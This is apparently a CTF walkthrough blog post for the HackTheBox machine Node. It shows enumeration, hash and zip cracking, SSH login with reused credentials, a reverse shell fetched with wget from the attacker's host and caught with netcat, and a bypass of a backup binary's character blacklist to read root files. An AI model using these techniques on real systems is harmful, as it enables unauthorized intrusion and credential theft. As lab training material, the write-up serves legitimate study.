Today we're going to decode the box Node at HTB. It's a very interesting box and I learned a lot about reverse engineering.


### Begin of NMAP

Let's start with nmap -T5 (to make this go quick) -n (to not do DNS) -vvv (to make nmap verbose and show us ports as they come back. To conclude the command the IP adress of Node which is 10.10.10.58.

```bash
nmap -T5 -n -vvv 10.10.10.58
```

These are the ports that came back.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/2-1.png)

Let's remove all of nmap flags and add -sC (for default scripts) and -sV (to enumerate versions). This time we do have 3000 Apache Hadoop. Nothing too interesting.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/2-2.png)

Let's add -p- to our command to scan all ports in the background.

```bash
nmap -p- -n -vvv 10.10.10.58  
```

In the meantime let's look at 10.10.10.58:3000. We have an internet page. We tried using gobuster to find the directories but with no avail. Let's do something new today.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/2-3.png)


### Examining Routes Files to find more pages

Thanks to Burp suite scope we don't have to use gobuster because we already have the page. We just won't find any hidden content. So since we're not going to be using GoBuster or DirBuster to find hidden content what we are going to do is find the app.js which is in the assets/js/app folder.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/4-1.png)

After sending the request to the repeater, this gives us the root for the web application and tell us a bunch of pages that we don't have. We see a templateUrl: '/partials/admin.html'. And over to our Target tab we didn't have that /partials/admin.html file... We also have profile.html and home.html.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/4-2.png)

Going to 10.10.10.58:3000/partials/admin.html, we probably can't download the backup because we don't have admin permission.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/4-3.png)


### Finding Credentials and downloading the backup

This time going to the /api/users web page, we have a bunch of usernames and passwords. Everyone password is 64 characters long. Let's assume that this is some kind of hash. We have is_admin : false on every users but one, "myP14ceAdm1nAcc0uNT". Let's figure out what this hashing algorithm is.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/5-1.png)

There are two ways we can do this. We could just go to Google and type “hash identify github” and use an hash identifier. Or go to hashes.org and submit the hash and see if it actually cracks. Let's submit all of them. We see it is just SHA256PLAIN and we have 2 out of 3. “tom” password f0e2 is going to be spongebob, and “mark” password de5a is going to be snowflake. The admin account, “myP14ceAdm1nAcc0uNT” password dffc is manchester.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/5-2.png)


### Cracking the zip with fcrackzip

This time we can download the backup. What we get is a very long ASCII text. It might be base64. Moving the content to the new file unknown and listing information about it, it's an archive file. And it's protected by a password!

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/6-1.png)

What we can do is use fcrackzip. We want to specify -D for dictionnary and then -p for the word list (/usr/share/wordlists/rockyou.txt). It looks like magicword may be the zip password. Unzipping again, type magicword and that was indeed the password.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/6-2.png)

Now we have the source code to the application. What we want to do now is search for “password”.

```bash
cd var/www/myplace
grep -Ri password  . | less
```

What we get is a mongodb which is what might some kind of database? Some javascript informations and then junk... Let's find out where the mango connection is controlled.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/6-3.png)


### Finding more credentials (SSH) with MongoSource

If we look at app.js in the /var/www/myplace folder, we do have the mongo client and we have potentially the password. 

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/7-1.png)

If we go back to our nmap scan where we scan all ports, we only have 22 and 3000 open still. So let's try to SSH with the above credentials.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/7-2.png)

Then we can log in to the box with that password. “mark” reuses his mangodb password as his localuser password. With a vertical split we're going to curl a simple http server with python, to bash.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/7-3.png)

Reading the processes, we have a note schedular running as “tom”. We probably want to look at this /var/scheduler/app.js file. 

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/7-4.png)

Inserting the mongo command (with the flag -p to specify mark's password) we can connect.

```bash
mongo -p -u mark scheduler  
```


### Privesc to Tom user

What we have to do now is try to elevate ourselves to Tom or root. First we download the reverse shell script and give it execute privileges.

```bash
cd /tmp
wget 10.10.14.12:5555/LinEnum.sh
chmod +x LinEnum.sh
```

Then connecting to mongodb thanks to Mark's id.  Downloading our script and confirming the tasks with db.tasks.find().

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/9-1.png)

All this time we were listening with netcat on port 1234. We are now Tom.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/9-2.png)

Looking back at the /var/scheduler/app.js file from earlier, we notice that the file /usr/local/bin/backup keeps getting call by the application.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/9-3.png)


### Analyzing Backup Binary File

It is quite a long string of base64 text so we'll use netcat to transfer it to our directory and work it there. We also checked with md5sum to see if we go the proper file.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/10-1.png)

Now we can begin analyzing exactly what backup does. Running the file, nothing happens. Checking it with strace, the backup doesn't really do anything and exits peacefully.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/10-2.png)


### Using strace to find binary password

Using radare2, we found out in the assembly code that there is a jump in the code. If the command doesn't take three arguments it exits. We tried again this time with three arguments but we still can't open the file.

```bash
./backup un deux trois
```

Doing a system trace once again, we can see that backup is trying to reach something at /etc/myplace/keys.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/11-1.png)

If we go to our box on /etc/myplace/keys, we get this file.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/11-2.png)

We copy and save the file in vi for later use. Looking back at app.js, const backup_key is equal to 45fa... and that is one the keys in /etc/myplace/keys.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/11-3.png)

The code for the backup is going to be /user/local/bin/backup -q, the backup key and the directory name.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/11-4.png)

What we we get is a short string of base64. It is a zip that we decompress after entering the password we had before: magicword.


```bash
./backup -q root@pokacyb)-[~] 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root
vi unknow.b64
base -d unknow.b64 > unknown
file unknown
mv unknown unknown.zip
7z e unknown.zip
```

And we get a troll face. Huh. That's obviously not what we're supposed to do.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/11-5.png)


### Finding blacklisted characters/words

There is something w	e missed in the assembly code. If -q is present during the command, the computer graphic won't run. Removing -q (but adding another parameter to compensate) we get the computer graphic.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/12-1.png)

Let us use Binary Ninja to take a look at a map of code. Below is where we have the blacklist. All the blacklisted words are tested on the left panel and the string on the bottom right is the base64 we don't want to hit.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/12-2.png)

Looking at the list of blacklisted words, we have “/root”, but we have also hexes. For exemple 0x3b converted to ASCII is “;”, 0x26 is “&”, etc... In total there were a dozen of bad characters.

![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/12-3.png)


### Abusing CWD

On our list of blacklisted characters, we notice that “/root” must not be inputed but that doesn't mean that “root” is also bad. This means that running the following command in the box gets us the proper base64 string.

```bash
tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root
``` 

Once again we process our base64 and unzip the file. This time no troll face. If we do a wc -c on root/root.txt we get 33 characters long so chances are it's a MD5sum file.


![_config.yml]({{ site.baseurl }}/images/2020/december/02/node/13-1.png)
